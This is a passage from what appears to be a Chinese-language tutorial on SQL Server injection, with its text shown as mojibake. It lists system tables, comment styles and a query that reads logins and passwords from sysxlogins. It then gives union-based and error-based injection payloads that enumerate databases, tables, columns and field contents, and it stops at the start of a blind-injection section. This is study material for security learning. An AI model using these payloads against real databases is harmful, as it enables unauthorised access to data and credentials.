<td>16384 = ANSI null default ï¼›ä½¿ç”¨ sp_dboption  è®¾ç½®ã€‚  <br>65536 = concat null yields null ï¼Œä½¿ç”¨ sp_dboption  è®¾ç½®ã€‚  <br>131072 = recursive triggers ï¼Œä½¿ç”¨ sp_dboption  è®¾ç½®ã€‚  <br>1048576 = default to local cursor ï¼Œä½¿ç”¨ sp_dboption  è®¾ç½®ã€‚ <br> 8388608 = quoted identifier ï¼Œä½¿ç”¨ sp_dboption  è®¾ç½®ã€‚  <br>33554432 = cursor close on commit ï¼Œä½¿ç”¨ sp_dboption  è®¾ç½®ã€‚  <br>67108864 = ANSI nulls  ,ä½¿ç”¨ sp_dboption  è®¾ç½®ã€‚  <br>268435456 = ANSI warnings  ï¼Œä½¿ç”¨ sp_dboption  è®¾ç½®ã€‚  <br>536870912 = full text enabled ï¼Œä½¿ç”¨  sp_fulltext_database è®¾ç½®ã€‚</td>
</tr>
<tr>
<td>crdate</td>
<td>datetime</td>
<td>åˆ›å»ºæ—¥æœŸã€‚</td>
</tr>
<tr>
<td>reserved</td>
<td>datetime</td>
<td>ç•™ä½œä»¥åä½¿ç”¨ã€‚</td>
</tr>
<tr>
<td>category</td>
<td>int</td>
<td>åŒ…å«ç”¨äºå¤åˆ¶çš„ä¿¡æ¯ä½å›¾ï¼š  1 =  å·²å‘å¸ƒã€‚  2 = å·²è®¢é˜…ã€‚  4 = åˆå¹¶å·²å‘å¸ƒã€‚  8 = åˆå¹¶å·²è®¢é˜…ã€‚</td>
</tr>
<tr>
<td>cmptlevel</td>
<td>tinyint</td>
<td>æ•°æ®åº“çš„å…¼å®¹çº§åˆ«ã€‚</td>
</tr>
<tr>
<td>filename</td>
<td>nvarchar(260)</td>
<td>æ•°æ®åº“ä¸»æ–‡ä»¶çš„æ“ä½œç³»ç»Ÿè·¯å¾„å’Œåç§°ã€‚</td>
</tr>
<tr>
<td>version</td>
<td>smallint</td>
<td>åˆ›å»ºæ•°æ®åº“æ—¶ä½¿ç”¨çš„ SQL Server ä»£ç å†…éƒ¨ç‰ˆæœ¬å·ã€‚ä»…ä¾› SQL Server å·¥å…·åœ¨å†…éƒ¨ç”¨äºå‡çº§å¤„ç†ã€‚</td>
</tr>
</tbody></table>
<h3 id="SysObjectsä»‹ç»"><a href="#SysObjectsä»‹ç»" class="headerlink" title="SysObjectsä»‹ç»"></a>SysObjectsä»‹ç»</h3><p><code>SysObjects</code>,åœ¨æ•°æ®åº“å†…åˆ›å»ºçš„æ¯ä¸ªå¯¹è±¡ï¼ˆçº¦æŸã€é»˜è®¤å€¼ã€æ—¥å¿—ã€è§„åˆ™ã€å­˜å‚¨è¿‡ç¨‹ç­‰ï¼‰åœ¨è¡¨ä¸­å ä¸€è¡Œã€‚åªæœ‰åœ¨ tempdb å†…ï¼Œæ¯ä¸ªä¸´æ—¶å¯¹è±¡æ‰åœ¨è¯¥è¡¨ä¸­å ä¸€è¡Œã€‚è¡¨ç»“æ„å¦‚ä¸‹ï¼š</p>
<table>
<thead>
<tr>
<th><strong>åˆ—å</strong></th>
<th><strong>æ•°æ®ç±»å‹</strong></th>
<th><strong>æè¿°</strong></th>
</tr>
</thead>
<tbody><tr>
<td>name</td>
<td>sysname</td>
<td>å¯¹è±¡å,å¸¸ç”¨åˆ—</td>
</tr>
<tr>
<td>id</td>
<td>int</td>
<td>å¯¹è±¡æ ‡è¯†å·</td>
</tr>
<tr>
<td><strong>xtype</strong></td>
<td>char(2)</td>
<td>å¯¹è±¡ç±»å‹ã€‚å¸¸ç”¨åˆ—ã€‚<strong>xtype</strong>å¯ä»¥æ˜¯ä¸‹åˆ—å¯¹è±¡ç±»å‹ä¸­çš„ä¸€ç§ï¼š   <br>C = CHECK çº¦æŸã€€ã€€<br>D = é»˜è®¤å€¼æˆ– DEFAULT çº¦æŸã€€ã€€<br>F = FOREIGN KEY çº¦æŸã€€ã€€<br>L = æ—¥å¿—ã€€ã€€<br>FN = æ ‡é‡å‡½æ•°   <br>IF = å†…åµŒè¡¨å‡½æ•° ã€€<br>P = å­˜å‚¨è¿‡ç¨‹ ã€€<br>PK = PRIMARY KEY çº¦æŸï¼ˆç±»å‹æ˜¯ Kï¼‰ ã€€<br>RF = å¤åˆ¶ç­›é€‰å­˜å‚¨è¿‡ç¨‹  <br> S = ç³»ç»Ÿè¡¨ ã€€<br>TF = è¡¨å‡½æ•° ã€€<br>TR = è§¦å‘å™¨ ã€€<br>U = ç”¨æˆ·è¡¨ ã€€<br>UQ = UNIQUE çº¦æŸï¼ˆç±»å‹æ˜¯ Kï¼‰  <br> V = è§†å›¾ ã€€<br>X = æ‰©å±•å­˜å‚¨è¿‡ç¨‹</td>
</tr>
<tr>
<td>uid</td>
<td>smallint</td>
<td>æ‰€æœ‰è€…ç”¨æˆ·å¯¹è±¡ç¼–å·</td>
</tr>
<tr>
<td>info</td>
<td>smallint</td>
<td>ä¿ç•™ã€‚ä»…é™å†…éƒ¨ä½¿ç”¨</td>
</tr>
<tr>
<td>status</td>
<td>int</td>
<td>ä¿ç•™ã€‚ä»…é™å†…éƒ¨ä½¿ç”¨</td>
</tr>
<tr>
<td>base_schema_ ver</td>
<td>int</td>
<td>ä¿ç•™ã€‚ä»…é™å†…éƒ¨ä½¿ç”¨</td>
</tr>
<tr>
<td>replinfo</td>
<td>int</td>
<td>ä¿ç•™ã€‚ä¾›å¤åˆ¶ä½¿ç”¨</td>
</tr>
<tr>
<td>parent_obj</td>
<td>int</td>
<td>çˆ¶å¯¹è±¡çš„å¯¹è±¡æ ‡è¯†å·ï¼ˆä¾‹å¦‚ï¼Œå¯¹äºè§¦å‘å™¨æˆ–çº¦æŸï¼Œè¯¥æ ‡è¯†å·ä¸ºè¡¨ IDï¼‰ã€‚</td>
</tr>
<tr>
<td>crdate</td>
<td>datetime</td>
<td>å¯¹è±¡çš„åˆ›å»ºæ—¥æœŸã€‚</td>
</tr>
<tr>
<td>ftcatid</td>
<td>smallint</td>
<td>ä¸ºå…¨æ–‡ç´¢å¼•æ³¨å†Œçš„æ‰€æœ‰ç”¨æˆ·è¡¨çš„å…¨æ–‡ç›®å½•æ ‡è¯†ç¬¦ï¼Œå¯¹äºæ²¡æœ‰æ³¨å†Œçš„æ‰€æœ‰ç”¨æˆ·è¡¨åˆ™ä¸º 0</td>
</tr>
<tr>
<td>schema_ver</td>
<td>int</td>
<td>ç‰ˆæœ¬å·ï¼Œè¯¥ç‰ˆæœ¬å·åœ¨æ¯æ¬¡è¡¨çš„æ¶æ„æ›´æ”¹æ—¶éƒ½å¢åŠ ã€‚</td>
</tr>
<tr>
<td>stats_schema_ ver</td>
<td>int</td>
<td>ä¿ç•™ã€‚ä»…é™å†…éƒ¨ä½¿ç”¨ã€‚</td>
</tr>
<tr>
<td>type</td>
<td>char(2)</td>
<td>å¯¹è±¡ç±»å‹ã€‚å¯ä»¥æ˜¯ä¸‹åˆ—å€¼ä¹‹ä¸€ï¼š   <br>C = CHECK çº¦æŸ  <br>D = é»˜è®¤å€¼æˆ– DEFAULT çº¦æŸ <br>F = FOREIGN KEY çº¦æŸ   <br>FN = æ ‡é‡å‡½æ•° <br>IF = å†…åµŒè¡¨å‡½æ•°  <br>K = PRIMARY KEY æˆ– UNIQUE çº¦æŸ   <br>L = æ—¥å¿— <br>P = å­˜å‚¨è¿‡ç¨‹ <br>R = è§„åˆ™  <br>RF = å¤åˆ¶ç­›é€‰å­˜å‚¨è¿‡ç¨‹   <br>S = ç³»ç»Ÿè¡¨  <br>TF = è¡¨å‡½æ•° <br>TR = è§¦å‘å™¨ <br>U = ç”¨æˆ·è¡¨ <br>V = è§†å›¾ <br>X = æ‰©å±•å­˜å‚¨è¿‡ç¨‹</td>
</tr>
<tr>
<td>userstat</td>
<td>smallint</td>
<td>ä¿ç•™ã€‚</td>
</tr>
<tr>
<td>sysstat</td>
<td>smallint</td>
<td>å†…éƒ¨çŠ¶æ€ä¿¡æ¯</td>
</tr>
<tr>
<td>indexdel</td>
<td>smallint</td>
<td>ä¿ç•™</td>
</tr>
<tr>
<td>refdate</td>
<td>datetime</td>
<td>ç•™ç”¨</td>
</tr>
<tr>
<td>version</td>
<td>int</td>
<td>ä¿ç•™</td>
</tr>
<tr>
<td>deltrig</td>
<td>int</td>
<td>ä¿ç•™</td>
</tr>
<tr>
<td>instrig</td>
<td>int</td>
<td>ä¿ç•™</td>
</tr>
<tr>
<td>updtrig</td>
<td>int</td>
<td>ä¿ç•™</td>
</tr>
<tr>
<td>seltrig</td>
<td>int</td>
<td>ä¿ç•™</td>
</tr>
<tr>
<td>category</td>
<td>int</td>
<td>ç”¨äºå‘å¸ƒã€çº¦æŸå’Œæ ‡è¯†</td>
</tr>
<tr>
<td>cache</td>
<td>smallint</td>
<td>ä¿ç•™</td>
</tr>
</tbody></table>
<h3 id="SysColumnsä»‹ç»"><a href="#SysColumnsä»‹ç»" class="headerlink" title="SysColumnsä»‹ç»"></a>SysColumnsä»‹ç»</h3><p><code>SysColumns</code>æ¯ä¸ªæ•°æ®åº“åˆ›å»ºåéƒ½ä¼šæœ‰ä¸€äº›ç³»ç»Ÿè¡¨ç”¨æ¥å­˜å‚¨è¯¥æ•°æ®åº“çš„ä¸€äº›åŸºæœ¬ä¿¡æ¯ã€‚æ¯ä¸ªè¡¨å’Œè§†å›¾ä¸­çš„æ¯åˆ—åœ¨è¡¨ä¸­å ä¸€è¡Œï¼Œå­˜å‚¨è¿‡ç¨‹ä¸­çš„æ¯ä¸ªå‚æ•°åœ¨è¡¨ä¸­ä¹Ÿå ä¸€è¡Œã€‚è¯¥è¡¨ä½äºæ¯ä¸ªæ•°æ®åº“ä¸­ã€‚è¡¨ç»“æ„å¦‚ä¸‹ï¼š</p>
<table>
<thead>
<tr>
<th>åˆ—å</th>
<th>æ•°æ®ç±»å‹</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>name</td>
<td>sysname</td>
<td>åˆ—åæˆ–è¿‡ç¨‹å‚æ•°çš„åç§°ã€‚</td>
</tr>
<tr>
<td>id</td>
<td>int</td>
<td>è¯¥åˆ—æ‰€å±çš„è¡¨å¯¹è±¡ IDï¼Œæˆ–ä¸è¯¥å‚æ•°å…³è”çš„å­˜å‚¨è¿‡ç¨‹ IDã€‚</td>
</tr>
<tr>
<td>xtype</td>
<td>tinyint</td>
<td>systypes ä¸­çš„ç‰©ç†å­˜å‚¨ç±»å‹ã€‚</td>
</tr>
<tr>
<td>typestat</td>
<td>tinyint</td>
<td>ä»…é™å†…éƒ¨ä½¿ç”¨ã€‚</td>
</tr>
<tr>
<td>xusertype</td>
<td>smallint</td>
<td>æ‰©å±•çš„ç”¨æˆ·å®šä¹‰æ•°æ®ç±»å‹ IDã€‚</td>
</tr>
<tr>
<td>length</td>
<td>smallint</td>
<td>systypes ä¸­çš„æœ€å¤§ç‰©ç†å­˜å‚¨é•¿åº¦ã€‚</td>
</tr>
<tr>
<td>xprec</td>
<td>tinyint</td>
<td>ä»…é™å†…éƒ¨ä½¿ç”¨ã€‚</td>
</tr>
<tr>
<td>xscale</td>
<td>tinyint</td>
<td>ä»…é™å†…éƒ¨ä½¿ç”¨ã€‚</td>
</tr>
<tr>
<td>colid</td>
<td>smallint</td>
<td>åˆ—æˆ–å‚æ•° IDã€‚</td>
</tr>
<tr>
<td>xoffset</td>
<td>smallint</td>
<td>ä»…é™å†…éƒ¨ä½¿ç”¨ã€‚</td>
</tr>
<tr>
<td>bitpos</td>
<td>tinyint</td>
<td>ä»…é™å†…éƒ¨ä½¿ç”¨ã€‚</td>
</tr>
<tr>
<td>reserved</td>
<td>tinyint</td>
<td>ä»…é™å†…éƒ¨ä½¿ç”¨ã€‚</td>
</tr>
<tr>
<td>colstat</td>
<td>smallint</td>
<td>ä»…é™å†…éƒ¨ä½¿ç”¨ã€‚</td>
</tr>
<tr>
<td>cdefault</td>
<td>int</td>
<td>è¯¥åˆ—çš„é»˜è®¤å€¼ IDã€‚</td>
</tr>
<tr>
<td>domain</td>
<td>int</td>
<td>è¯¥åˆ—çš„è§„åˆ™æˆ– CHECK çº¦æŸ IDã€‚</td>
</tr>
<tr>
<td>number</td>
<td>smallint</td>
<td>è¿‡ç¨‹åˆ†ç»„æ—¶ï¼ˆ0 è¡¨ç¤ºéè¿‡ç¨‹é¡¹ï¼‰çš„å­è¿‡ç¨‹å·ã€‚</td>
</tr>
<tr>
<td>colorder</td>
<td>smallint</td>
<td>ä»…é™å†…éƒ¨ä½¿ç”¨ã€‚</td>
</tr>
<tr>
<td>autoval</td>
<td>varbinary(255)</td>
<td>ä»…é™å†…éƒ¨ä½¿ç”¨ã€‚</td>
</tr>
<tr>
<td>offset</td>
<td>smallint</td>
<td>è¯¥åˆ—æ‰€åœ¨è¡Œçš„åç§»é‡ï¼›å¦‚æœä¸ºè´Ÿï¼Œè¡¨ç¤ºå¯å˜é•¿åº¦è¡Œã€‚</td>
</tr>
<tr>
<td>status</td>
<td>tinyint</td>
<td>ç”¨äºæè¿°åˆ—æˆ–å‚æ•°å±æ€§çš„ä½å›¾ï¼š <br>0x08 = åˆ—å…è®¸ç©ºå€¼ã€‚ <br>0x10 = å½“æ·»åŠ  varchar æˆ– varbinaryåˆ—æ—¶ï¼ŒANSI å¡«å……ç”Ÿæ•ˆã€‚ä¿ç•™ varchar åˆ—çš„å°¾éšç©ºæ ¼ï¼Œä¿ç•™ varbinary åˆ—çš„å°¾éšé›¶ã€‚ <br>0x40 = å‚æ•°ä¸º OUTPUT å‚æ•°ã€‚ <br>0x80 = åˆ—ä¸ºæ ‡è¯†åˆ—ã€‚</td>
</tr>
<tr>
<td>type</td>
<td>tinyint</td>
<td>systypes ä¸­çš„ç‰©ç†å­˜å‚¨ç±»å‹ã€‚</td>
</tr>
<tr>
<td>usertype</td>
<td>smallint</td>
<td>systypes ä¸­çš„ç”¨æˆ·å®šä¹‰æ•°æ®ç±»å‹ IDã€‚</td>
</tr>
<tr>
<td>printfmt</td>
<td>varchar(255)</td>
<td>ä»…é™å†…éƒ¨ä½¿ç”¨ã€‚</td>
</tr>
<tr>
<td>prec</td>
<td>smallint</td>
<td>è¯¥åˆ—çš„ç²¾åº¦çº§åˆ«ã€‚</td>
</tr>
<tr>
<td>scale</td>
<td>int</td>
<td>è¯¥åˆ—çš„å°æ•°ä½æ•°ã€‚</td>
</tr>
<tr>
<td>iscomputed</td>
<td>int</td>
<td>è¡¨ç¤ºæ˜¯å¦å·²è®¡ç®—è¯¥åˆ—çš„æ ‡å¿—ï¼š 0 = æœªè®¡ç®—ã€‚ 1 = å·²è®¡ç®—ã€‚</td>
</tr>
<tr>
<td>isoutparam</td>
<td>int</td>
<td>è¡¨ç¤ºè¯¥è¿‡ç¨‹å‚æ•°æ˜¯å¦æ˜¯è¾“å‡ºå‚æ•°ï¼š 1 = çœŸã€‚ 0 = å‡ã€‚</td>
</tr>
<tr>
<td>isnullable</td>
<td>int</td>
<td>è¡¨ç¤ºè¯¥åˆ—æ˜¯å¦å…è®¸ç©ºå€¼ï¼š 1 = çœŸã€‚ 0 = å‡ã€‚</td>
</tr>
</tbody></table>
<h3 id="é»˜è®¤æ•°æ®åº“"><a href="#é»˜è®¤æ•°æ®åº“" class="headerlink" title="é»˜è®¤æ•°æ®åº“"></a>é»˜è®¤æ•°æ®åº“</h3><table>
<thead>
<tr>
<th>åº“å</th>
<th>é€‚ç”¨ç‰ˆæœ¬</th>
</tr>
</thead>
<tbody><tr>
<td>pubs</td>
<td>ä¸é€‚ç”¨äºMSSQL 2005</td>
</tr>
<tr>
<td>model</td>
<td>é€‚ç”¨äºæ‰€æœ‰ç‰ˆæœ¬</td>
</tr>
<tr>
<td>msdb</td>
<td>é€‚ç”¨äºæ‰€æœ‰ç‰ˆæœ¬</td>
</tr>
<tr>
<td>tempdb</td>
<td>é€‚ç”¨äºæ‰€æœ‰ç‰ˆæœ¬</td>
</tr>
<tr>
<td>northwind</td>
<td>é€‚ç”¨äºæ‰€æœ‰ç‰ˆæœ¬</td>
</tr>
<tr>
<td>information_schema</td>
<td>é€‚ç”¨äºMSSQL 2000åŠæ›´é«˜ç‰ˆæœ¬</td>
</tr>
</tbody></table>
<h3 id="æ³¨é‡Šé£æ ¼"><a href="#æ³¨é‡Šé£æ ¼" class="headerlink" title="æ³¨é‡Šé£æ ¼"></a>æ³¨é‡Šé£æ ¼</h3><table>
<thead>
<tr>
<th>æ³¨é‡Šç¬¦</th>
<th>æ³¨é‡Šé£æ ¼</th>
</tr>
</thead>
<tbody><tr>
<td>/ *</td>
<td>Cè¯­è¨€é£æ ¼æ³¨é‡Š</td>
</tr>
<tr>
<td>â€“</td>
<td>SQLæ³¨é‡Š</td>
</tr>
<tr>
<td>; 00ï¼…</td>
<td>ç©ºå­—èŠ‚</td>
</tr>
</tbody></table>
<h3 id="æ•°æ®åº“å‡­æ®"><a href="#æ•°æ®åº“å‡­æ®" class="headerlink" title="æ•°æ®åº“å‡­æ®"></a>æ•°æ®åº“å‡­æ®</h3><table>
<thead>
<tr>
<th>ç±»å‹</th>
<th>æ•°æ®åº“æ ‡è¯†</th>
</tr>
</thead>
<tbody><tr>
<td>æ•°æ®åº“è¡¨</td>
<td>master..syslogins, master..sysprocesses</td>
</tr>
<tr>
<td>åˆ—å</td>
<td>name, loginame</td>
</tr>
<tr>
<td>å½“å‰ç”¨æˆ·</td>
<td>user, system_user, suser_sname(), is_srvrolemember(â€˜sysadminâ€™)</td>
</tr>
<tr>
<td>æ•°æ®åº“å‡­æ®</td>
<td>SELECT user, password FROM master.dbo.sysxlogins  # æ³¨æ„æƒé™</td>
</tr>
</tbody></table>
<h2 id="æ˜¾æ€§æ³¨å…¥"><a href="#æ˜¾æ€§æ³¨å…¥" class="headerlink" title="æ˜¾æ€§æ³¨å…¥"></a>æ˜¾æ€§æ³¨å…¥</h2><p>è¯¥ç¤ºä¾‹ä½¿ç”¨åœ¨çº¿ç¯å¢ƒæµ‹è¯•ï¼š<span class="exturl" data-url="aHR0cHM6Ly9yZXh0ZXN0ZXIuY29tL2wvc3FsX3NlcnZlcl9vbmxpbmVfY29tcGlsZXI=">https://rextester.com/l/sql_server_online_compiler<i class="fa fa-external-link-alt"></i></span></p>
<p>(æœ¬å°èŠ‚ä¸­è¯­å¥å‡ä¸ºè‡ªå·±æ„é€ ã€‚)</p>
<h3 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h3><ul>
<li>é¦–å…ˆç¡®å®šå­—æ®µæ•°<code>order by N--</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- ç¡®å®šå­—æ®µæ•°</span><br><span class="line">select ProductID from t where ProductID&#x3D;68 order by 1 --</span><br><span class="line"></span><br><span class="line">-- ç¡®å®šå¯åˆ©ç”¨å­—æ®µæ•° ï¼ˆè¿™é‡Œä¸¤ä¸ªå­—æ®µåä¸€æ ·ä¸ºäº†å‡è£…å¤šä¸ªå­—æ®µã€‚ã€‚ã€‚ï¼‰</span><br><span class="line">select ProductID,ProductID from t where ProductID&#x3D;68 and 1&#x3D;2 union select 1,2</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>æŸ¥è¯¢æ•°æ®åº“</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- æŸ¥è¯¢å½“å‰åº“</span><br><span class="line">select ProductID,ProductID from t where ProductID&#x3D;68 and 1&#x3D;2 union Select 1,db_name()</span><br><span class="line"></span><br><span class="line">-- ä¾æ¬¡ä½¿ç”¨ !&#x3D; æŸ¥è¯¢æ•°æ®åº“åç§°</span><br><span class="line">select ProductID,ProductID from t where ProductID&#x3D;68 and 1&#x3D;2 union Select 1,Name FROM Master..SysDatabases where name !&#x3D; &#39;master&#39; and name !&#x3D; &#39;model&#39;</span><br></pre></td></tr></table></figure>

<ul>
<li>æŸ¥è¯¢è¡¨</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- å½“å‰åº“çš„ç¬¬ä¸€ä¸ªè¡¨</span><br><span class="line">select ProductID,ProductID from t where ProductID&#x3D;68 and 1&#x3D;2 union SELECT TOP 1 table_name,1 FROM information_schema.tables </span><br><span class="line"></span><br><span class="line">-- åˆ©ç”¨ !&#x3D; ä¾æ¬¡åˆ¤æ–­å½“å‰åº“ä¸­çš„è¡¨</span><br><span class="line">select ProductID,ProductID from t where ProductID&#x3D;68 and 1&#x3D;2 union SELECT TOP 1 table_name,1 FROM information_schema.tables where table_name !&#x3D;&#39;Pilots&#39; and table_name !&#x3D; &#39;Planes&#39; and table_name !&#x3D; &#39;Flights&#39; and table_name !&#x3D; &#39;Pilots_on_flights&#39; and table_name !&#x3D; &#39;t&#39;     </span><br><span class="line"></span><br><span class="line">-- ç”¨æˆ·</span><br><span class="line">select ProductID,ProductID from t where ProductID&#x3D;68 and 1&#x3D;2 union SELECT 1,name FROM master..sysobjects WHERE xtype&#x3D;&#39;U&#39;</span><br></pre></td></tr></table></figure>

<ul>
<li>å­—æ®µå</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- å½“å‰åº“çš„ç¬¬ä¸€ä¸ªè¡¨çš„ç¬¬ä¸€ä¸ªå­—æ®µå</span><br><span class="line">select ProductID,ProductID from t where ProductID&#x3D;68 and 1&#x3D;2 union SELECT TOP 1 column_name,1 FROM information_schema.columns</span><br><span class="line"></span><br><span class="line">-- ä¾æ¬¡æŸ¥è¯¢å½“å‰æŸ¥è¯¢æ‰€ä½¿ç”¨çš„è¡¨çš„å­—æ®µå</span><br><span class="line"></span><br><span class="line">select ProductID,ProductID from t where ProductID&#x3D;68 and 1&#x3D;2 union SELECT TOP 1 column_name,1 FROM information_schema.columns where column_name !&#x3D; &#39;Birth_date&#39;</span><br><span class="line"></span><br><span class="line">--(å¦‚æœéœ€è¦æŒ‡å®šè¡¨åï¼šwhere table_name&#x3D;&#39;xx&#39;æˆ–è€… where table_name&#x3D;åå…­è¿›åˆ¶è¡¨å)</span><br><span class="line">select ProductID,ProductID from t where ProductID&#x3D;68 and 1&#x3D;2 union SELECT TOP 1 column_name,1 FROM information_schema.columns where table_name &#x3D; &#39;Pilots&#39; and column_name !&#x3D; &#39;ID&#39;</span><br></pre></td></tr></table></figure>

<ul>
<li>å­—æ®µå†…å®¹</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- æŸ¥è¯¢æŒ‡å®šè¡¨ä¸­æŒ‡å®šå­—æ®µå†…å®¹</span><br><span class="line">select ProductID,ProductID from t where ProductID&#x3D;68 and 1&#x3D;2 union SELECT 1,ProductID from t</span><br><span class="line"></span><br><span class="line">-- ä¾æ¬¡æŸ¥è¯¢ã€‚ã€‚</span><br><span class="line">select ProductID,ProductID from t where ProductID&#x3D;68 and 1&#x3D;2 union SELECT 1,ProductID from t where ProductID !&#x3D; 68</span><br></pre></td></tr></table></figure>

<h3 id="æŠ¥é”™æ³¨å…¥å‡½æ•°"><a href="#æŠ¥é”™æ³¨å…¥å‡½æ•°" class="headerlink" title="æŠ¥é”™æ³¨å…¥å‡½æ•°"></a>æŠ¥é”™æ³¨å…¥å‡½æ•°</h3><p><code>convert()</code>å‡½æ•°,<code>CONVERT()</code>å‡½æ•°æ˜¯æŠŠâ½‡æœŸè½¬æ¢ä¸ºæ–°æ•°æ®ç±»å‹çš„é€šâ½¤å‡½æ•°ã€‚é™¤æ­¤ä¹‹å¤–è¿˜æœ‰ï¼š<code>file_name()</code>, <code>db_name()</code>,<code>col_name()</code>,<code>filegroup_name()</code>,<code>object_name()</code>,<code>schema_name()</code>,<code>type_name()</code>,<code>cast()</code>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CONVERT(data_type(length),data_to_be_converted,style)</span><br><span class="line">æ³¨é‡Š ï¼š</span><br><span class="line">data_type(length) è½¬æ¢ä¸ºâ½¬æ ‡æ•°æ®ç±»å‹ï¼ˆå¸¦æœ‰å¯é€‰çš„é•¿åº¦ï¼‰ã€‚</span><br><span class="line">data_to_be_converted å«æœ‰éœ€è¦è½¬æ¢çš„å€¼ã€‚</span><br><span class="line">style è§„å®šâ½‡æœŸ&#x2F;æ—¶é—´çš„è¾“å‡ºæ ¼å¼ã€‚</span><br><span class="line"></span><br><span class="line">convert(@@version)</span><br><span class="line">db_name(@@version)</span><br><span class="line">file_name(@@version)</span><br><span class="line">col_name(1,@@version)</span><br><span class="line">filegroup_name(@@version)</span><br><span class="line">object_name(@@version)</span><br><span class="line">schema_name(@@version)</span><br><span class="line">type_name(@@version)</span><br><span class="line">cast(@@version as int)   -- CAST (expression AS data_type)  è¡¨è¾¾å¼ as æ•°æ®ç±»å‹</span><br></pre></td></tr></table></figure>

<p><strong>ç¤ºä¾‹</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CONVERT(VARCHAR(19),GETDATE())</span><br><span class="line">CONVERT(VARCHAR(10),GETDATE(),110) </span><br><span class="line">CONVERT(VARCHAR(11),GETDATE(),106)</span><br><span class="line">CONVERT(VARCHAR(24),GETDATE(),113)</span><br><span class="line"></span><br><span class="line">Dec 29 2008 11:45 PM</span><br><span class="line">12-29-2008</span><br><span class="line">29 Dec 08</span><br><span class="line">29 Dec 2008 16:25:46.635</span><br></pre></td></tr></table></figure>

<p><strong>åŸç†</strong></p>
<p>å¯¹äº <code>convert(int,@@version)</code>ï¼Œ<code>convert</code> å‡½æ•°â¾¸å…ˆä¼šæ‰§â¾ç¬¬â¼†ä¸ªå‚æ•°æŒ‡å®šçš„SQLæŸ¥è¯¢ï¼Œç„¶åå°è¯•å°†æŸ¥è¯¢ç»“æœè½¬æ¢ä¸º<code>int</code>ç±»å‹ã€‚ä½†æ˜¯ï¼Œç”±äºè¿™ä¸ªSQLæŸ¥è¯¢çš„ç»“æœæ˜¯<code>varchar</code>ç±»å‹ï¼Œâ½†æ³•è¿›â¾æŒ‡å®šçš„è½¬æ¢ï¼Œæ‰€ä»¥ï¼Œ<code>convert</code>å‡½æ•°ä¼šæŠ›å‡º â¼€ä¸ª<code>SQL server</code>é”™è¯¯æ¶ˆæ¯ï¼ŒæŒ‡å‡ºâ€œSQLæŸ¥è¯¢ç»“æœâ€â½†æ³•è½¬æ¢ä¸º<code>â€œintâ€</code>ç±»å‹ï¼Œè¿™æ ·çš„è¯ï¼Œæ”»å‡»è€…å°±èƒ½å¾—åˆ°çš„è¿™ä¸ªSQLæŸ¥è¯¢çš„ç»“æœäº†ã€‚</p>
<p>å…·ä½“ç¤ºä¾‹å‚è€ƒï¼š(å‰ææ˜¯æœ‰é”™è¯¯ä¿¡æ¯è¿”å›)ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select ProductID from t where ProductID&#x3D;68 and 1&#x3D;2 union Select convert(int,@@version)</span><br></pre></td></tr></table></figure>

<h2 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h2><p>è¯¥ç¤ºä¾‹ä½¿ç”¨åœ¨çº¿ç¯å¢ƒæµ‹è¯•ï¼š<span class="exturl" data-url="aHR0cDovL3NxbGZpZGRsZS5jb20vIyExOC9mZjZiOC8xMzU5MQ==">http://sqlfiddle.com/#!18/ff6b8/13591<i class="fa fa-external-link-alt"></i></span></p>
<p>(æœ¬å°èŠ‚ä¸­è¯­å¥å‡ä¸ºè‡ªå·±æ„é€ ã€‚) é¡µé¢ä¸­é€‰ä¸­SQL Server 2017 ï¼Œç‚¹å‡» view sample fiddleä¼šæœ‰é»˜è®¤çš„è¯­å¥ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE ForgeRock</span><br><span class="line">    ([productName] varchar(13), [description] varchar(57))</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line">INSERT INTO ForgeRock</span><br><span class="line">    ([productName], [description])</span><br><span class="line">VALUES</span><br><span class="line">    (&#39;OpenIDM&#39;, &#39;Platform for building enterprise provisioning solutions&#39;),</span><br><span class="line">    (&#39;OpenAM&#39;, &#39;Full-featured access management&#39;),</span><br><span class="line">    (&#39;OpenDJ&#39;, &#39;Robust LDAP server for Java&#39;)</span><br><span class="line">;</span><br></pre></td></tr></table></figure>

<h3 id="Boolç›²æ³¨"><a href="#Boolç›²æ³¨" class="headerlink" title="Boolç›²æ³¨"></a>Boolç›²æ³¨</h3><p>é¡µé¢åªæœ‰ä¸¤ä¸ªçŠ¶æ€ï¼Œè¿”å›æ­£å¸¸ï¼Œè¿”å›é”™è¯¯ã€‚ä¹Ÿå³æ˜¯åªæœ‰æ­£ç¡®ä¸å¦ã€‚</p>
<p>ç›²æ³¨æ‰€ç”¨ä¸»è¦å‡½æ•°ä¸ºï¼š<code>len(str)</code>åˆ¤æ–­é•¿åº¦ï¼Œ<code>substring(str,start,end)</code>æˆªå–å­—ç¬¦ä¸²ï¼Œ<code>ascii(char)</code>åˆ¤æ–­å­—ç¬¦ä¸²çš„ASCIIå€¼ã€‚</p>
